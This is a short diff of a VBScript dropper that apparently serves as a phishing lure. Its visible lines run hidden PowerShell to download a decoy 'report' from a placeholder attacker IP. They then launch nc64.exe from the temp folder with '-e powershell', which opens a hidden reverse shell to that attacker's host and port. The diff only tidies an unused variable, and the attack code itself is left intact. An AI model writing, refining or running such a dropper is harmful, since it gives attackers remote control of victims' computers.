@@ -1,5 +1,4 @@
 Set objShell = CreateObject("Wscript.Shell")
-Set objFSO = CreateObject("Scripting.FileSystemObject")
 
 ' Download fake report
 downloadRaport = "powershell -WindowStyle Hidden -Command ""(New-Object System.Net.WebClient).DownloadFile('http://<ATTACKER IP>/raport.txt', '%TEMP%\raport.txt')"""
@@ -16,5 +15,4 @@ objShell.Run downloadCmd, 0, True
 execCmd = "cmd /c powershell -Command ""Start-Process \""%TEMP%\nc64.exe\"" -ArgumentList '<ATTACKER IP>', '<PORT>', '-e', 'powershell' -WindowStyle Hidden"""
 objShell.Run execCmd, 0, True
 
-Set objFSO = Nothing
 Set objShell = Nothing
